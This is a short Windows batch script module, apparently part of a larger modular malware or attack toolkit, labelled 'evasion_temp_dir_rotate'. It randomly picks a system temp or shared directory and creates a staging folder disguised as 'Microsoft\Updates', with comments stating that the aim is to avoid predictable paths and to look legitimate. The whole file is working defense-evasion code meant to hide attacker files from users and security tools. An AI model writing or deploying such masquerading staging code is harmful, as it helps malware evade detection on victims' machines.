REM provides: evasion_temp_dir_rotate
REM depends: (none)
REM description: Randomly select working temp directory to avoid predictable paths

REM Choose from multiple legitimate temp locations
set /a "DIR_IDX=%RANDOM% %% 4"

if %DIR_IDX%==0 set "WORK_DIR=%TEMP%"
if %DIR_IDX%==1 set "WORK_DIR=%PUBLIC%"
if %DIR_IDX%==2 set "WORK_DIR=%LOCALAPPDATA%\Temp"
if %DIR_IDX%==3 set "WORK_DIR=%PROGRAMDATA%"

REM Create a subdirectory with a legitimate-sounding name
set "SUB_DIR=%WORK_DIR%\Microsoft\Updates"
if not exist "%SUB_DIR%" mkdir "%SUB_DIR%" >nul 2>nul

REM Export for use by other chunks
set "WORKING_TEMP=%SUB_DIR%"
